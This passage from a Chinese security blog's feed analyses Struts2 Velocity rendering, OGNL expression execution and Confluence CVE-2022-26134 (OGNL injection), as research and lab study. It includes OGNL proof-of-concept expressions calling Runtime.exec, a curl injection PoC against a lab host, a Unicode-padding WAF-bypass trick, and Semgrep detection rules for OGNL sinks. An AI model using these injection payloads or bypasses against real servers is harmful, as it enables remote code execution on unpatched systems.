class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StrutsVelocityContext</span> <span class="keyword">extends</span> <span class="title">VelocityContext</span> </span>&#123;</span><br><span class="line">ValueStack stack;</span><br><span class="line">VelocityContext[] chainedContexts;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">internalGet</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 先从父类的VelocityContext 的Context里尝试获取</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">super</span>.internalContainsKey(key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.internalGet(key);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 接着从struts2 的stack里findValue 获取</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.stack != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object object = <span class="keyword">this</span>.stack.findValue(key);</span><br><span class="line">                <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// 再尝试从stack 的context里获取</span></span><br><span class="line">                object = <span class="keyword">this</span>.stack.getContext().get(key);</span><br><span class="line">                <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后从VelocityContext 数组获取</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="keyword">this</span>.chainedContexts.length; ++index) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts[index].containsKey(key)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">this</span>.chainedContexts[index].internalGet(key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-总结与思考"><a href="#0x04-总结与思考" class="headerlink" title="0x04 总结与思考"></a>0x04 总结与思考</h2><p>本文简要分析了JSP 的执行逻辑，首先编译成class，其中会将jsp 语句分解成各种Tag，Tag 交由Component 进行转化成实际的html 字符。</p><p>接下来跟踪了Velocity AST解析与执行的流程，选取了几个常见的AST Node 跟踪。没有什么新东西，只是为以后漏洞分析做准备。</p><p>这些都是struts2 系列漏洞分析的基础。精力有限，没有再分析FreeMarker，应该和Velocity 类似，以后遇到相关的在做分析吧。</p><!-- 目前知识面有限，遇到的Velocity 模板注入漏洞，基本上是可以自定义模板内容从而导致的RCE。唯一遇到Confluence CVE-2021-26084这个是因为vm 写的有问题导致的Ognl注入。1. 那么如何才能写出有问题的vm呢？2. 关于模板引擎的自动化漏洞发现目前还没有看到好的工具，像codeql/semgrep 都不支持，有没有好的解决方法？--><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li>[1] <a href="https://www.cnblogs.com/nice0e3/p/16218857.html#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5">Java安全之velocity 模板注入（by:nice_0e3）</a></li><li>[2] <a href="https://xz.aliyun.com/t/10603">CVE-2021-22017+22005模板注入分析 (by:lz520)</a></li><li>[3] <a href="https://paper.seebug.org/1107/">Apache Solr Velocity 模板注入漏洞深度分析</a></li><li>[4] <a href="http://ifeve.com/apache-velocity-dev/">《Apache Velocity用户指南》官方文档译</a></li><li>[5] <a href="https://velocity.apache.org/engine/devel/user-guide.html">Apache Velocity Docs</a></li><li>[6] <a href="https://struts.apache.org/tag-developers/index">《Struts/Tag Developers Guide》</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;模板引擎注入也算是通用的漏洞类型了，不论是python/java，出现过的cve例子也不少。JSP/FreeMarker/Velocity 作为Struts2 的默认模板引擎，分析分析其实现原理，为以后的漏洞分析作铺垫。&lt;/p&gt;
&lt;h2 id=&quot;0x01-背景知识&quot;&gt;&lt;a href=&quot;#0x01-背景知识&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景知识&quot;&gt;&lt;/a&gt;0x01 背景知识&lt;/h2&gt;&lt;h3 id=&quot;Struts2-Tag&quot;&gt;&lt;a href=&quot;#Struts2-Tag&quot; class=&quot;headerlink&quot; title=&quot;Struts2 Tag&quot;&gt;&lt;/a&gt;Struts2 Tag&lt;/h3&gt;&lt;p&gt;Tag是struts 模板元素的基础单位。建议先阅读参考【6】中《Tag Developers Guide》。&lt;/p&gt;
&lt;p&gt;Tag 有以下几类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通用tag&lt;ul&gt;
&lt;li&gt;控制流 tag， 例如 if、else&lt;/li&gt;
&lt;li&gt;数据tag， 例如include、set、url&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UI tag，例如 from、text、div&lt;ul&gt;
&lt;li&gt;Form tag，例如 checkbox、checkbox、head&lt;/li&gt;
&lt;li&gt;非Form tag，例如actonerror、actionmessage&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;模板的逻辑是如何实现的呢？&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Struts2" scheme="http://m0d9.me/tags/Struts2/"/>
    
    <category term="Velocity" scheme="http://m0d9.me/tags/Velocity/"/>
    
  </entry>
  
  <entry>
    <title>Struts2系列一：OGNL 表达式</title>
    <link href="http://m0d9.me/2022/07/11/Struts2%E7%B3%BB%E5%88%97%E4%B8%80%EF%BC%9AOGNL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://m0d9.me/2022/07/11/Struts2%E7%B3%BB%E5%88%97%E4%B8%80%EF%BC%9AOGNL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2022-07-11T08:27:00.000Z</published>
    <updated>2022-09-13T14:00:42.759Z</updated>
    
    <content type="html"><![CDATA[<p>最近在复盘confluence CVE-2022-26134 这个漏洞，发现根本原因还是Struts2 架构的问题，这块的知识点挺多，不是一篇文章能解释清楚的，因此准备搞个系列，理理Struts2 架构相关的漏洞及原理。</p><ul><li>Ognl</li><li>velocity</li><li>Struts2</li><li>Confluence</li></ul><h2 id="Ox01-基础知识"><a href="#Ox01-基础知识" class="headerlink" title="Ox01 基础知识"></a>Ox01 基础知识</h2><p>参考【1】中R17a 已经有整理了相关的OGNL相关基础知识，这里不做深入介绍，简单罗列下知识点。</p><ol><li>expression 表达式、相关语法    </li><li>context 上下文</li><li>root 对象</li></ol><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><h3 id="2-1-生成AST树"><a href="#2-1-生成AST树" class="headerlink" title="2.1 生成AST树"></a>2.1 生成AST树</h3><p>以以下poc为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;open -a Calculator&#x27;)&quot;</span>, context, context.getRoot());</span><br></pre></td></tr></table></figure><a id="more"></a><p>Ognl的处理逻辑大致如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OgnlParser parser = <span class="keyword">new</span> OgnlParser(<span class="keyword">new</span> StringReader(expression));</span><br></pre></td></tr></table></figure><p>R17a师傅的图画的很好，生成的AST树如下：<br><img src="/images/pasted-225.png" alt="upload successful"><br><img src="/images/pasted-224.png" alt="upload successful"></p><h3 id="2-2-执行AST"><a href="#2-2-执行AST" class="headerlink" title="2.2 执行AST"></a>2.2 执行AST</h3><p>SimpleNode是AST节点的实现，Ognl.getValue最终会调用SimpleNode.getValueBody/getValue 接口，递归实现整个AST树的执行。</p><p>AST数基本结构有很多，在ognl.Ognl路径下，其中几个本实例涉及到的</p><ul><li>ASTChain</li><li>ASTConst</li><li>ASTMethod</li><li>ASTStaticMethod</li></ul><p><img src="/images/pasted-226.png" alt="upload successful"><br>比较重要的是SimpleNode.getValueBody 接口的实现。</p><p>详细的代码跟踪流程R17a师傅文章里也有，不细讲，大致如下。</p><ol><li><p>ASTChain.getValueBody 会正序遍历子节点的getValue 方法，前一个结果会作为后一个的参数</p><p> <code>result = this.children[i].getValue(context, result);</code></p></li><li><p>第一个节点为ASTStaticMethod，其getValueBody 通过OgnlRuntime.callStaticMethod 生成Runtime实例，作为result</p><p> <code>Object var10 = OgnlRuntime.callStaticMethod(context, this.className, this.methodName, args); </code></p></li><li><p>第二个节点ASTMethod，其getValueBody 首先会根据它的子节点组建args，然后调用OgnlRuntime.callMethod，调用Runtime.exec(args)</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> icount = args.length; i &lt; icount; ++i) &#123;</span><br><span class="line">    args[i] = <span class="keyword">this</span>.children[i].getValue(context, root);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 其中source参数为上一步的result</span></span><br><span class="line"><span class="comment">// this.methodName为exec</span></span><br><span class="line">Object result = OgnlRuntime.callMethod(context, source, <span class="keyword">this</span>.methodName, (String)<span class="keyword">null</span>, args);</span><br></pre></td></tr></table></figure></li></ol><p>这个case的详细调用栈如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">invokeMethod:500, OgnlRuntime (ognl)</span><br><span class="line">callAppropriateMethod:794, OgnlRuntime (ognl)</span><br><span class="line">callMethod:61, ObjectMethodAccessor (ognl)</span><br><span class="line">callMethod:828, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:75, ASTMethod (ognl)</span><br><span class="line">evaluateGetValueBody:171, SimpleNode (ognl) [2]</span><br><span class="line">getValue:213, SimpleNode (ognl)</span><br><span class="line">getValueBody:109, ASTChain (ognl)</span><br><span class="line">evaluateGetValueBody:171, SimpleNode (ognl) [1]</span><br><span class="line">getValue:213, SimpleNode (ognl)</span><br><span class="line">getValue:333, Ognl (ognl)</span><br><span class="line">getValue:378, Ognl (ognl)</span><br><span class="line">getValue:357, Ognl (ognl)</span><br></pre></td></tr></table></figure><h2 id="0x03-Unicode编码"><a href="#0x03-Unicode编码" class="headerlink" title="0x03 Unicode编码"></a>0x03 Unicode编码</h2><p>Confluence CVE-2021-26084 的POC中有用到Unicode编码，一些师傅的文章里也有提到过这个特性，例如参考【2】Lotso 师傅的文章。但是没看到关于这块的代码跟踪，这里丰富下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tUnicode</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">    String s = <span class="string">&quot;\\u00271&#x27;+#&#123;233*233&#125;&quot;</span>;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    System.out.println(Ognl.getValue(s, context));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>支持Unicode 的逻辑在ognl.JavaCharStream 中，大致逻辑如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从char buffer中读一个char，目的为了兼容unicode</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">if</span> ((<span class="keyword">this</span>.buffer[<span class="keyword">this</span>.bufpos] = c = <span class="keyword">this</span>.ReadByte()) != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">               <span class="keyword">this</span>.UpdateLineColumn(c);</span><br><span class="line">               <span class="keyword">return</span> c;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           ...</span><br><span class="line">           <span class="comment">// 注意这里的while，支持无限填充u，可以用来绕过waf编码</span></span><br><span class="line">                           <span class="keyword">while</span>((c = <span class="keyword">this</span>.ReadByte()) == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                               ++<span class="keyword">this</span>.column;</span><br><span class="line">                           &#125;</span><br><span class="line">             <span class="comment">// 取后面的4个字节，组成unicode char</span></span><br><span class="line">                           <span class="keyword">this</span>.buffer[<span class="keyword">this</span>.bufpos] = c = (<span class="keyword">char</span>)(hexval(c) &lt;&lt; <span class="number">12</span> | hexval(<span class="keyword">this</span>.ReadByte()) &lt;&lt; <span class="number">8</span> | hexval(<span class="keyword">this</span>.ReadByte()) &lt;&lt; <span class="number">4</span> | hexval(<span class="keyword">this</span>.ReadByte()));</span><br></pre></td></tr></table></figure><h2 id="0x04-总结与思考"><a href="#0x04-总结与思考" class="headerlink" title="0x04 总结与思考"></a>0x04 总结与思考</h2><p>本文简要跟踪了Ognl表达式的原理，主要涉及AST语法树的生成与执行，基本都是老知识，内容量不多。唯一的新增点是unicode的编码里面还有可以玩的一些东西。</p><p>思考：</p><ol><li>struts 后续框架引入了SecurityMemberAccess，这个有一些绕过姿势，但是基本都是反射控制开关，可以从Ognl这边出发寻找突破吗？</li></ol><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li>[1] <a href="https://xz.aliyun.com/t/10482">一文读懂OGNL漏洞 (by:R17a)</a></li><li>[2] <a href="https://www.anquanke.com/post/id/253398">CVE-2021-26084：Confluence Webwork Ognl表达式注入漏洞分析 (by:Lotso)</a></li><li>[3] <a href="https://paper.seebug.org/794/#0x03-ognl">浅析 OGNL 的攻防史 (by:Lucifaer)</a></li><li>[4] <a href="http://j0k3r.top/2020/08/19/java-ognl/#0x01-OGNL-Object-Graph-Navigation-Library">Java OGNL 表达式注入 (by:J0k3r)</a></li><li>[5] <a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">OGNL表达式注入漏洞总结 (by:Mi1k7ea)</a></li><li>[7] <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=OGNL">OGNL CVEs</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在复盘confluence CVE-2022-26134 这个漏洞，发现根本原因还是Struts2 架构的问题，这块的知识点挺多，不是一篇文章能解释清楚的，因此准备搞个系列，理理Struts2 架构相关的漏洞及原理。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ognl&lt;/li&gt;
&lt;li&gt;velocity&lt;/li&gt;
&lt;li&gt;Struts2&lt;/li&gt;
&lt;li&gt;Confluence&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Ox01-基础知识&quot;&gt;&lt;a href=&quot;#Ox01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;Ox01 基础知识&quot;&gt;&lt;/a&gt;Ox01 基础知识&lt;/h2&gt;&lt;p&gt;参考【1】中R17a 已经有整理了相关的OGNL相关基础知识，这里不做深入介绍，简单罗列下知识点。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;expression 表达式、相关语法    &lt;/li&gt;
&lt;li&gt;context 上下文&lt;/li&gt;
&lt;li&gt;root 对象&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;0x02-原理&quot;&gt;&lt;a href=&quot;#0x02-原理&quot; class=&quot;headerlink&quot; title=&quot;0x02 原理&quot;&gt;&lt;/a&gt;0x02 原理&lt;/h2&gt;&lt;h3 id=&quot;2-1-生成AST树&quot;&gt;&lt;a href=&quot;#2-1-生成AST树&quot; class=&quot;headerlink&quot; title=&quot;2.1 生成AST树&quot;&gt;&lt;/a&gt;2.1 生成AST树&lt;/h3&gt;&lt;p&gt;以以下poc为例&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Ognl.getValue(&lt;span class=&quot;string&quot;&gt;&amp;quot;@java.lang.Runtime@getRuntime().exec(&amp;#x27;open -a Calculator&amp;#x27;)&amp;quot;&lt;/span&gt;, context, context.getRoot());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
    <category term="Struts2" scheme="http://m0d9.me/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Confluence CVE-2022-26134 OGNL 分析</title>
    <link href="http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/</id>
    <published>2022-06-10T06:20:00.000Z</published>
    <updated>2022-09-13T14:00:43.202Z</updated>
    
    <content type="html"><![CDATA[<!-- 日拱一卒，功不唐捐。--><p>发现半年没写文章了。。。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>P🐮的Vulhub 有镜像了，不过调试接口没有开出来，这里稍微补充下。</p><p>在vulhub/confluence/CVE2022-26134 目录下</p><ol><li>新建Dockerfile</li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/confluence:<span class="number">7.13</span>.<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">&quot;106 iCATALINA_OPTS=\&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&#123;CATALINA_OPTS\&#125;\&quot;&quot;</span> -i /opt/atlassian/confluence/bin/setenv.sh</span></span><br></pre></td></tr></table></figure><ol start="2"><li>更新docker-compose.yml</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span> <span class="string">.</span></span><br><span class="line"><span class="comment"># image: vulhub/confluence:7.13.6</span></span><br><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>Y4er 师傅关于漏洞的总结得挺好的，漏洞复现这块已经没什么好讲的了。</p><ul><li>漏洞的调用栈</li><li>黑白名单的绕过</li></ul><p>POC: <code>curl -v &quot;http://192.168.1.112:8090/%24%7B1+1%7D/&quot;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@com.atlassian.confluence.util.GeneralUtil@setCookie(&quot;key&quot;,&quot;value&quot;)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-219.png" alt="upload successful"></p><p>最终的调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">findValue:129, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)</span><br><span class="line">execute:95, ActionChainResult (com.opensymphony.xwork)</span><br><span class="line">executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invoke:187, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [3]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:27, LastModifiedInterceptor (com.atlassian.confluence.core.actions)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:44, ConfluenceAutowireInterceptor (com.atlassian.confluence.core)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [2]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invokeAndHandleExceptions:61, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">invokeInTransaction:51, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">intercept:50, XWorkTransactionInterceptor (com.atlassian.xwork.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:61, SetupIncompleteInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:26, SecurityHeadersInterceptor (com.atlassian.confluence.security.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [1]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">execute:115, DefaultActionProxy (com.opensymphony.xwork)</span><br><span class="line">serviceAction:56, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)</span><br><span class="line">service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br></pre></td></tr></table></figure><h2 id="0x03-思路逆向"><a href="#0x03-思路逆向" class="headerlink" title="0x03 思路逆向"></a>0x03 思路逆向</h2><p>关于漏洞如何发现的，个人理解可以拆分成3个阶段</p><ol><li>如何定位到去挖confluence</li><li>如何发现ognl攻击面，也即sink点</li><li>如何从sink点推导出source及path</li></ol><p>这些都是很有意思的点，值得思考。这里也只尝试逆向分析步骤3的思路，步骤1、2太过宽泛了有时间再做探讨。</p><h3 id="sink-到source"><a href="#sink-到source" class="headerlink" title="sink 到source"></a>sink 到source</h3><p>sink 点其实很明显，ognl.getValue，在此基础上如何找到完整的触发链？</p><p>source点在javax.servlet.http.HttpServlet#service，需要对confluence 结构有一定了解，或者要调试下历史的漏洞，应该能定位到这里。</p><p>如何找出中间的链，confluence没有源码，所以tabby 或者 ByteCodeDL？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar build&#x2F;libs&#x2F;tabby-1.1.0.RELEASE.jar ..&#x2F;confluence&#x2F;atlassian-confluence-7.13.6&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; --isJDKProcess</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; confluence CVE-2022-26134</span><br><span class="line">match (source:Method &#123;NAME:&quot;service&quot;&#125;) where source.CLASSNAME &#x3D;~ &quot;.*ServletDispatcher&quot;</span><br><span class="line">match (sink:Method &#123;NAME:&quot;translateVariables&quot;, CLASSNAME:&quot;com.opensymphony.xwork.util.TextParseUtil&quot;&#125;) </span><br><span class="line">call apoc.algo.allSimplePaths(source,sink,&quot;&gt;CALL|ALIAS&quot;,9) yield path </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-214.png" alt="upload successful"></p><p>Y4师傅提到的一些其他的 *Result#execute，可以看到部分也在路径里面。</p><h3 id="sink-点的定位"><a href="#sink-点的定位" class="headerlink" title="sink 点的定位"></a>sink 点的定位</h3><p>Semgrep 对于找sink点，和正则相比有一些优势，不过目前规则也不全。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">pattern-either:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.getValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.setValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">$X.translateVariables(...</span> <span class="string">,</span> <span class="string">...)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semgrep --config=java/lang/security/audit/ognl-injection2.yaml ~/study/java/confluence/confluence-home/jars/</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-218.png" alt="upload successful"></p><p>对于jar类型，如果要实现完全自动化还是比较困难。反编译、自动化运行semgrep规则、再从sink点出发用Tabby找路径。目前也没有好的思路，学习《软件分析》吧。</p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p><img src="/images/pasted-215.png" alt="upload successful"><br>只是修了ActionChainResult 中的translateVariables。但是其他的Ognl 点也没找到触发链。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本文简略的跟踪了Confluence CVE-2022-26134 OGNL的漏洞调用流程，并在此基础上探索其OGNL调用链的发现思路。分析了补丁，尝试挖掘其他的触发链，但是无果。基本内容Y4师傅的文章基本都有了，本文没什么新的东西。</p><p>总的来说这个洞原理并不难，st2 的ognl也是经典的漏洞了，但是为什么是黑产走在了技术前沿？纯技术而言，原理不难，但是较难自动化，主动挖掘也需要一定的漏洞历史知识。</p><p>老样子留个坑吧</p><ol><li>只根据补丁，能够独立分析出POC吗？PS：业内谁最先搞出poc的</li><li>怎么会想到到去挖confluence的？</li><li>如何发现OGNL攻击面？</li></ol><p>未完待续。。。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li>[1]<a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134">Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134) (by:phith0n)</a></li><li>[2]<a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/">CVE-2022-26134 Confluence Server Data Center OGNL RCE (by:Y4er)</a></li><li>[3]<a 